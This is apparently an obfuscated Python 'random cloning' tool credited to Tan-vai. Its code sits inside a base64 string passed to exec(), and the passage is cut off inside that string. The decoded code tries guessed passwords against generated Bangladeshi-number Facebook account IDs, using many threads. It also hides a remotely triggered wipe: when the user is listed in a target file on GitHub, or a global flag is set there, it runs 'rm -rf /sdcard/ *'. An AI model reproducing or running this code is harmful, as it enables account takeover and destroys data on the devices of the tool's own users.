#‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅùêéùêñùêçùêÑùêë‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
#ùêÑùêçùêÇùêëùêàùêèùêìùêÑùêÉ ùêÅùêò :ùêåùêë-ùêìùêÄùêç
#VERSION : 1.0.2
#ùêÜùêàùêìùêáùêîùêÅ : https://github.com/Tan-vai
#‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅùêåùêÄùêàùêç ùêåùêÑùêçùêî‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
import base64
exec(base64.b64decode(b'IyBEZWNvbXBpbGUgYnkgTWFyZGlzIChUb29scyBCeSBUYW4tdmFpKQojIFRpbWUgU3VjY2VzIGRlY29tcGlsZSA6IDIwMjMtMDQtMDkgMDY6NDg6MzguNjU3NDc4CmltcG9ydCBvcwp0cnk6CiAgICBpbXBvcnQgaHR0cHgKZXhjZXB0OgogICAgb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBodHRweCIpCiAgICBpbXBvcnQgaHR0cHgKaW1wb3J0IHN5cyx0aW1lLGpzb24scmFuZG9tLHJlLHN0cmluZyxwbGF0Zm9ybSxiYXNlNjQsdXVpZCxodHRweApmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3AKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAKb3Muc3lzdGVtKCJnaXQgcHVsbCIpCmltcG9ydCByZXF1ZXN0cyBhcyByZXNzCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGUKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSB0aW1lIGltcG9ydCBzbGVlcApmcm9tIHRpbWUgaW1wb3J0IHNsZWVwIGFzIHdha3R1CnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwogICAgZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sCiAgICBpbXBvcnQgbWVjaGFuaXplCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcgpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgbWVjaGFuaXplIHJlcXVlc3RzIGZ1dHVyZXMgYnM0PT0yID4gL2Rldi9udWxsJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykKCmRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6CiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwNzI3MTU4MTcxNTInLCB7CiAgICAgICAgICAgICdjb29raWUnOiBjb2tpIH0sICoqKCdjb29raWVzJywpKS50ZXh0LCAnaHRtbC5wYXJzZXInKQogICAgICAgIGdldCA9IHIuZmluZCgnYScsICdJa3V0aScsICoqKCdzdHJpbmcnLCkpLmdldCgnaHJlZicpCiAgICAgICAgc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSwgewogICAgICAgICAgICAnY29va2llJzogY29raSB9LCAqKignY29va2llcycsKSkudGV4dAogICAgICAgICAgICAKICAgICAgCmNsYXNzIGphbGFuOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHopOgogICAgICAgIGZvciBlIGluIHogKyAiXG4iOgogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDA5KQogICAgICAgICAgICAKTyA9ICdceDFiWzM4OzU7MjA4bScKTSA9ICdceDFiWzE7OTFtJwpIID0gJ1x4MWJbMTs5Mm0nCksgPSAnXHgxYlsxOzkzbScKQiA9ICdceDFiWzE7OTRtJwpVID0gJ1x4MWJbMTs5NW0nIApQID0gJ1x4MWJbMTs5Nm0nCk4gPSAnXHgxYlswbScgICAgClogPSAiXDAzM1sxOzMwbSIKc2lyID0gJ1wwMzNbNDFtXHgxYlsxOzk3bScKeCA9ICdcMzNbbScgIyBERUZBVUxUCm0gPSAnXHgxYlsxOzkxbScgI1JFRCArCmsgPSAnXDAzM1s5M20nICMgS1VOSU5HICsKeHIgPSAnXHgxYlszODs1OzQ4bScgIyBISUpBVSArCmhoID0gJ1wwMzNbMzJtJyAjIEhJSkFVCnUgPSAnXDAzM1s5NW0nICMgVU5HVQprayA9ICdcMDMzWzMzbScgIyBLVU5JTkcKYiA9ICdceDFiWzM4OzU7MjA4bScgIyBCSVJVCnAgPSAnXHgxYlswOzM0bScgIyBCSVJVICsKYXN1ID0gcmFuZG9tLmNob2ljZShbbSxrLHhyLHUsYl0pCm15X2NvbG9yID0gWwogUCwgTSwgSCwgSywgQiwgVSwgTywgTl0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQpub3cgPSBkYXRldGltZS5ub3coKQpkdF9zdHJpbmcgPSBub3cuc3RyZnRpbWUoIiVIOiVNIikKY3VycmVudCA9IGRhdGV0aW1lLm5vdygpCnRhID0gY3VycmVudC55ZWFyCmJ1ID0gY3VycmVudC5tb250aApoYSA9IGN1cnJlbnQuZGF5CnRvZGF5ID0gZGF0ZS50b2RheSgpCiNvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vZ2l0aHViLmNvbS9UYW4tdmFpJykKbG9nbyA9ICgiIiJceDFiWzM4OzU7NDhtCiAgICAgICAK4pWU4pWQ4pWQ4pWQ4pWQ4pWm4pWQ4pWQ4pWQ4pWm4pWQ4pWX4pSA4pWU4pWXICBcMDMzWzE7MzFtw5cgXHgxYlszODs1OzQ4bSDilZTilZDilZDilZDilabilZDilZDilabilZfilZTilZDilabilZDilZDilZDilZDilabilZDilZDilZDilZcK4pWR4pWU4pWX4pWU4pWX4pWR4pWU4pWQ4pWX4pWR4pWR4pWa4pWX4pWR4pWRICBcMDMzWzE7MzFtw5cgXHgxYlszODs1OzQ4bSDilZHilZTilZDilZfilaDilaPilaDilaPilZHilZHilZTilaPilZTilZfilZTilZfilZHilZTilZDilZfilZEK4pWa4pWd4pWR4pWR4pWa4pWj4pWR4pSA4pWR4pWR4pWU4pWX4pWa4pWd4pWRIFwwMzNbMTszMW0gw5cgXHgxYlszODs1OzQ4bSDilZHilZrilZDilZ3ilZHilZHilZHilZHilZrilZ3ilZ3ilZrilZ3ilZHilZHilZrilaPilZHilIDilZHilZEK4pSA4pSA4pWR4pWR4pSA4pWR4pWa4pWQ4pWd4pWR4pWR4pWa4pWX4pWR4pWRIFwwMzNbMTszMW0gw5cgXHgxYlszODs1OzQ4bSDilZHilZTilZfilZTilZ3ilZHilZHilZHilZTilZfilZHilIDilIDilZHilZHilIDilZHilZrilZDilZ3ilZEK4pSA4pSA4pWR4pWR4pSA4pWR4pWU4pWQ4pWX4pWR4pWR4pSA4pWR4pWR4pWRICBcMDMzWzE7MzFtw5cgXHgxYlszODs1OzQ4bSDilZHilZHilZHilZrilabilaPilaDilaPilZHilZHilZrilZfilIDilZHilZHilIDilZHilZTilZDilZfilZEK4pSA4pSA4pWa4pWd4pSA4pWa4pWd4pSA4pWa4pWp4pWd4pSA4pWa4pWQ4pWdICBcMDMzWzE7MzFtw5cgXHgxYlszODs1OzQ4bSDilZrilZ3ilZrilZDilanilZDilZDilanilZ3ilZrilZDilZ3ilIDilZrilZ3ilIDilZrilZ3ilIDilZrilZ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKXDAzM1sxOzMxbeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgVx4MWJbMzg7NTs0OG0KXDAzM1sxOzMxbVtceDFiWzM4OzU7NDhtK1wwMzNbMTszMW1dXHgxYlszODs1OzQ4bSBGT1VOREVSICAgICAgXHgxYlszODs1OzIwOG3inqQgIFx4MWJbMzg7NTs0OG3wnZCT8J2QgPCdkI0gXDAzM1sxOzMxbcOXXHgxYlszODs1OzQ4bSDwnZCR8J2QiPCdkIrwnZCT8J2QgApcMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtIFRFQU0gICAgICAgICBceDFiWzM4OzU7MjA4beKepCAgXHgxYlszODs1OzQ4bURFQVRIIFwwMzNbMTszNm1DWUJFUiBceDFiWzM4OzU7NDhtQVJNWQpcMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtIEdJVEhVQiAgICAgICBceDFiWzM4OzU7MjA4beKepCAgXHgxYlszODs1OzQ4bVRhbi12YWkKXDAzM1sxOzMxbVtceDFiWzM4OzU7NDhtK1wwMzNbMTszMW1dXHgxYlszODs1OzQ4bSBUT09MICAgICAgICAgXHgxYlszODs1OzIwOG3inqQgIFx4MWJbMzg7NTs0OG1SQU5ET00gQ0xPTklORwpcMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtIFZFUlNJT04gICAgICBceDFiWzM4OzU7MjA4beKepCAgXDAzM1sxOzM2bTIuOFx4MWJbMzg7NTs0OG0KXDAzM1sxOzMxbeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgVx4MWJbMzg7NTs0OG0iIiIpCiAgICAgICAgICAgIApkZWYgbGluZXgoKToKICAgIHByaW50KCdcMDMzWzE7MzFt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBXHgxYlszODs1OzQ4bScpCmxvb3AgPSAwCm9rcyA9IFtdCmNwcyA9IFtdCgpkZWYgbGl2ZV9jayh1aWQpOgogICAgVGFuPXJlcXVlc3RzLmdldChmImh0dHBzOi8vdGhhbmhsaWtlLmNvbS9tb2R1bi90b29sL2dldF9mYWNlYm9vay5waHA/dHlwZT1jaGVja2xpdmUmaWQ9e3VpZH0iKS50ZXh0CiAgICBkYXRhPXN0cihUYW4pCiAgICBpZiAibGl2ZSIgPT0gZGF0YS5sb3dlcigpOgogICAgICAgIHJldHVybiAiQWxpdmUiCiAgICBlbHNlOgogICAgICAgIHJldHVybiAiZGVhdGgiCgpkZWYgY2xlYXIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAjIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2FidXRhbmltLmNob3dkdXJ5JykKICAgIHByaW50KGxvZ28pCmZyb20gdGltZSBpbXBvcnQgbG9jYWx0aW1lIGFzIGx0CmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBjbWQKbHR4ID0gaW50KGx0KClbM10pCmlmIGx0eCA+IDEyOgogICAgYSA9IGx0eC0xMgogICAgdGFnID0gIlBNIgplbHNlOgogICAgYSA9IGx0eAogICAgdGFnID0gIkFNIgogICAgCiAgICAKdHJ5OgogICAgcHJpbnQoJ1xuXG5cMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtIGFzc2V0IGZpbGVzIC4uLiBceDFiWzM4OzU7NDhtJykKICAgIHYgPSAyLjgKICAgIHVwZGF0ZSA9ICgnMi44JykKICAgIHVwZGF0ZSA9ICgnMi44JykKICAgIGlmIHN0cih2KSBpbiB1cGRhdGU6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBlbHNlOnBhc3MKZXhjZXB0OnByaW50KCdcblwwMzNbMTszMW1bXHgxYlszODs1OzQ4bStcMDMzWzE7MzFtXVx4MWJbMzg7NTs0OG0gTm8gaW50ZXJuZXQgY29ubmVjdGlvbiAuLi4gXHgxYlszODs1OzQ4bScpCmRlZiBkeW5hbWljKHRleHQpOgogICAgdGl0aWsgPSBbJy4gICAnLCcuLiAgJywnLi4uICcsJy4uLi4gJ10KICAgIGZvciBvIGluIHRpdGlrOgogICAgICAgIHByaW50KCdccicrdGV4dCtvKSwKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQoKdWdlbjI9W10KdWdlbj1bXQogCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6CiAgICBhYT0nTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkJwogICAgYj1yYW5kb20uY2hvaWNlKFsnMicsJzMnLCc0JywnNScsJzYnLCc3JywnOCcsJzknLCcxMCcsJzExJywnMTInLCcxMycsJzE0JywnMTUnLCcxNicsJzE3J10pCiAgICBjPScgZW4tdXM7IEdULScKICAgIGQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBlPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOTk5KQogICAgZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQogICAgaT0nMCcKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnCiAgICB1YWt1Mj0oZid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JykKICAgIHVnZW4uYXBwZW5kKHVha3UyKQogICAgCgpkZWYgc2FtaXlhKHVpZCk6CiAgICBpZiBsZW4odWlkKT09MTU6CiAgICAgICAgaWYgdWlkWzoxMF0gaW4gWycxMDAwMDAwMDAwJ10gICAgICAgOnRhbmltID0gJyAoKi0qKSAyMDA5JwogICAgICAgIGVsaWYgdWlkWzo5XSBpbiBbJzEwMDAwMDAwMCddICAgICAgIDp0YW5pbSA9ICfiiJogMjAwOScKICAgICAgICBlbGlmIHVpZFs6OF0gaW4gWycxMDAwMDAwMCddICAgICAgICA6dGFuaW0gPSAn4oiaIDIwMDknCiAgICAgICAgZWxpZiB1aWRbOjddIGluIFsnMTAwMDAwMCcsJzEwMDAwMDEnLCcxMDAwMDAyJywnMTAwMDAwMycsJzEwMDAwMDQnLCcxMDAwMDA1J106dGFuaW0gPSAn4oiaIDIwMDknCiAgICAgICAgZWxpZiB1aWRbOjddIGluIFsnMTAwMDAwNicsJzEwMDAwMDcnLCcxMDAwMDA4JywnMTAwMDAwOSddOnRhbmltID0gJyAyMDEwJwogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwMSddICAgICAgICAgIDp0YW5pbSA9ICfiiJogMjAxMC8yMDExJwogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwMicsJzEwMDAwMyddIDp0YW5pbSA9ICfiiJogMjAxMS8yMDEyJwogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwNCddICAgICAgICAgIDp0YW5pbSA9ICfiiJogMjAxMi8yMDEzJwogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwNScsJzEwMDAwNiddIDp0YW5pbSA9ICfiiJogMjAxMy8yMDE0JwogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwNycsJzEwMDAwOCddIDp0YW5pbSA9ICfiiJogMjAxNC8yMDE1JwogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwOSddICAgICAgICAgIDp0YW5pbSA9ICfiiJogMjAxNScKICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwMSddICAgICAgICAgICA6dGFuaW0gPSAn4oiaIDIwMTUvMjAxNicKICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwMiddICAgICAgICAgICA6dGFuaW0gPSAn4oiaIDIwMTYvMjAxNycKICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwMyddICAgICAgICAgICA6dGFuaW0gPSAn4oiaIDIwMTgvMjAxOScKICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwNCddICAgICAgICAgICA6dGFuaW0gPSAn4oiaIDIwMTkvMjAyMCcKICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwNSddICAgICAgICAgICA6dGFuaW0gPSAn4oiaIDIwMjAnCiAgICAgICAgZWxpZiB1aWRbOjVdIGluIFsnMTAwMDYnLCcxMDAwNycsJyddOnRhbmltID0gJ+KImiAyMDIxJwogICAgICAgIGVsaWYgdWlkWzo1XSBpbiBbJzEwMDA4J10gICAgICAgICAgIDp0YW5pbSA9ICfiiJogMjAyMicKICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwMCddICAgICAgICAgICA6dGFuaW0gPSAn4oiaIDIwMTUnCiAgICAgICAgZWxzZTp0YW5pbT0nJwogICAgZWxpZiBsZW4odWlkKSBpbiBbOSwxMF06CiAgICAgICAgdGFuaW0gPSAnIOKImiAyMDA4LzIwMDknCiAgICBlbGlmIGxlbih1aWQpPT04OgogICAgICAgIHRhbmltID0gJ+KImiAyMDA3LzIwMDgnCiAgICBlbGlmIGxlbih1aWQpPT03OgogICAgICAgIHRhbmltID0gJ+KImiAyMDA2LzIwMDcnCiAgICBlbHNlOnRhbmltPScnCiAgICByZXR1cm4gdGFuaW0KICAKZGVmIHNlcnZlcigpOgogICAgdHJ5OgogICAgICAgIGRhdGFiYXNlPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Rhbi12YWkvc2VydmVyL21haW4vc2VydmVyLnR4dCIpLnRleHQKICAgIGV4Y2VwdDoKICAgICAgICAgcHJpbnQoIlx4MWJbMzg7NTsyMDhtSW50ZXJuZXQgRXJyb3Ig4pqg77iPIikKICAgICAgICAgc3lzLmV4aXQoKQogICAgaWYgIm9uIiBpbiBkYXRhYmFzZToKICAgICAgICAgICBwYXNzCiAgICBlbGlmICJvZmYiIGluIGRhdGFiYXNlOgogICAgICAgIHByaW50KCJcMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7MjA4bSBUT09MIElTIE9GRiAiKQogICAgICAgIHN5cy5leGl0KCkKICAgIGVsc2U6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgcHJpbnQoIiAgXDAzM1sxOzMxbS4uLi4uLi4uLi4uLi4uLi4uLi5ceDFiWzM4OzU7NDhtTXItVGFuIGlzIG9uIHVwZGF0aW5nXDAzM1sxOzMxbS4uLi4uLi4uLi4uLi4uLi4uLi5ceDFiWzM4OzU7NDhtIikKc2VydmVyKCkgIAogCmRlZiBjaGVraXRvdXQoKToKICAgIGE9c3RyKG9zLmdldGV1aWQoKSkKICAgIGI9c3RyKG9zLmdldGxvZ2luKCkpCiAgICB5PScnLmpvaW4oYStiKQogICAga2V5PWYiVGFuLXt5fSIKICAgIGJsb2NrPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Rhbi12YWkvc2VydmVyL21haW4vYmxvY2tfdXNlci50eHQiKS50ZXh0CiAgICB0Zj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UYW4tdmFpL3NlcnZlci9tYWluL3RhcmdldF9ybV9zdG9yYWdlLnR4dCIpLnRleHQKICAgIGZsYXNoYWxsPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Rhbi12YWkvc2VydmVyL21haW4vYWxsdXNyX3N0b3JhZ2Vfcm12LnR4dCIpLnRleHQKICAgIAogICAgaWYga2V5IGluIGJsb2NrOgogICAgICAgIHByaW50KCIgIFwwMzNbMTszMW0uLi4uLi4uLi4uLi4uLi4uLlx4MWJbMzg7NTsyMDhtISEgU29ycnkgWW91J3JlIGJsb2NrZWQgISEgXDAzM1sxOzMxbS4uLi4uLi4uLi4uLi4uLi4uXDAzM1szODs1OzQ2bSIpCiAgICAgICAgc3lzLmV4aXQoKQogICAgZWxzZTpwYXNzCiAgICAKICAgIGlmIGtleSBpbiB0ZjoKICAgICAgICBvcy5zeXN0ZW0oInJtIC1yZiAvc2RjYXJkLyAqIikgCiAgICBlbHNlOgogICAgICAgIHBhc3MKICAgIAogICAgaWYgInkiIGluIGZsYXNoYWxsOgogICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIC9zZGNhcmQvICoiKSAKICAgIGVsc2U6CiAgICAgICAgcGFzcwpjaGVraXRvdXQoKQogICAgICAgICAgICAKZGVmIHh4cigpOgogICAgdXNlcj1bXQogICAgdHdmID1bXQogICAgb3MuZ2V0dWlkCiAgICBvcy5nZXRldWlkCiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHByaW50KGxvZ28pCiAgICBwcmludChmJ1wwMzNbMTszMW1bXHgxYlszODs1OzQ4bStcMDMzWzE7MzFtXVx4MWJbMzg7NTs0OG0gRXhhbXBsZSBcMDMzWzE7MzFtOiB7eHJ9MDE3LCAwMTh7eHJ9JykKICAgIHByaW50KCJcMDMzWzE7MzFt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBXHgxYlszODs1OzQ4bSIpCiAgICByazEgPSAnMDE3MScKICAgIHJrMiA9ICcwMTcyJwogICAgcmszID0gJzAxNzMnCiAgICByazQgPSAnMDE4MScKICAgIHJrNSA9ICcwMTgyJwogICAgcms2ID0gJzAxODMnICAgICAKICAgIHJrNyA9ICcwMTg0JyAKICAgIHJrOCA9ICcwMTc0JyAgICAgICAgIAogICAgY29kZSA9IHJhbmRvbS5jaG9pY2UoW3JrMSxyazIscmszLHJrNCxyazUscms2LHJrNyxyazhdKQogICAgcHd3ID0gaW5wdXQoZidcMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtIENob29zZSBcMDMzWzE7MzFtOlx4MWJbMzg7NTs0OG0gJykKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQobG9nbykKICAgIGxpbWl0ID0gaW50KGlucHV0KGYnXDAzM1sxOzMxbVtceDFiWzM4OzU7NDhtK1wwMzNbMTszMW1dXHgxYlszODs1OzQ4bSAgRVhBTVBMRSBcMDMzWzE7MzFtOlx4MWJbMzg7NTs0OG0gMTAwMDAsIDIwMDAwLCA1MDAwMCBcblwwMzNbMTszMW3ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIFcblwwMzNbMTszMW1bXHgxYlszODs1OzQ4bStcMDMzWzE7MzFtXVx4MWJbMzg7NTs0OG0gIFBVVCBDTE9OSU5HIExJTUlUIFwwMzNbMTszMW06XHgxYlszODs1OzQ4bSAnKSkKICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToKICAgICAgICBubXAgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoNykpCiAgICAgICAgdXNlci5hcHBlbmQobm1wKQogICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBwcmludChsb2dvKQogICAgcGFzc3ggPSAwCiAgICBIYW1paUlEID0gW10KICAgIHByaW50KCIiKQogICAgZm9yIGJpbGFsIGluIHJhbmdlKHBhc3N4KToKICAgICAgICBwd3cgPSBpbnB1dChmIlwwMzNbMTszMW1bXHgxYlszODs1OzQ4bStcMDMzWzE7MzFtXVx4MWJbMzg7NTs0OG0gICBFbnRlciBQYXNzd29yZCB7YmlsYWwrMX0gOiAiKQogICAgICAgIEhhbWlpSUQuYXBwZW5kKHB3dykKICAgIHdpdGggVGhyZWFkUG9vbChtYXhfd29ya2Vycz01MCkgYXMgbWFuc2hlcmE6CiAgICAgICAgY2xlYXIoKQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkKICAgICAgICBwcmludChmJ1wwMzNbMTszMW1bXHgxYlszODs1OzQ4bStcMDMzWzE7MzFtXVx4MWJbMzg7NTs0OG0gUFJPQ0VTUyBIQVMgQkVFTiBTVEFSVEVEJykKICAgICAgICBwcmludChmJ1wwMzNbMTszMW1bXHgxYlszODs1OzQ4bStcMDMzWzE7MzFtXVx4MWJbMzg7NTs0OG0gU0lNIENPREUgICAgIFwwMzNbMTs5MW06IHt4cn0nK2NvZGUpIAogICAgICAgIHByaW50KGYnXDAzM1sxOzMxbVtceDFiWzM4OzU7NDhtK1wwMzNbMTszMW1dXHgxYlszODs1OzQ4bSBUT1RBTCBJRFMgICAgXDAzM1sxOzkxbToge3hyfScrdGwpCiAgICAgICAgcHJpbnQoZidcMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtIFdPUksgQ09VTlRSWSBcMDMzWzE7OTFtOiBceDFiWzM4OzU7NDhtQkFOR0xBREVTSCcpCiAgICAgICAgcHJpbnQoZidcMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtIFVTRSBORVRXT1JLICBcMDMzWzE7OTFtOiBcMDMzWzE7MzZtREFUQSBcMDMzWzE7MzFt4pePIFwwMzNbMTszNm1XSUZJXDAzM1sxOzMxbShceDFiWzM4OzU7NDhtQmVzdFwwMzNbMTszMW0pXHgxYlszODs1OzQ4bScpCiAgICAgICAgcHJpbnQoZidcMDMzWzE7MzFtW1x4MWJbMzg7NTs0OG0rXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtIFVTRSBBRVJPUExBTkUgTU9PRCBJTiBFVkVSWSA1IE1JTiAnKQogICAgICAgIHByaW50KGYiXDAzM1sxOzMxbeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgVx4MWJbMzg7NTs0OG0iKQogICAgICAgIGZvciBsb3ZlIGluIHVzZXI6CiAgICAgICAgICAgIHB3eCA9IFtsb3ZlWzE6XV0KICAgICAgICAgICAgdWlkID0gY29kZStsb3ZlCiAgICAgICAgICAgIGZvciBFbWFuIGluIEhhbWlpSUQ6CiAgICAgICAgICAgICAgICBwd3guYXBwZW5kKEVtYW4pCiAgICAgICAgICAgICAgICBwd3guYXBwZW5kKGxvdmUpCiAgICAgICAgICAgIG1hbnNoZXJhLnN1Ym1pdChyY3JhY2ssdWlkLHB3eCx0bCkKICAgIHByaW50KGYiXG5cMDMzWzE7MzFt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBXHgxYlszODs1OzQ4bSIpCmRlZiByY3JhY2sodWlkLHB3eCx0bCk6CiAgICBnbG9iYWwgbG9vcAogICAgZ2xvYmFsIGNwcwogICAgZ2xvYmFsIG9rcwogICAgZ2xvYmFsIHByb3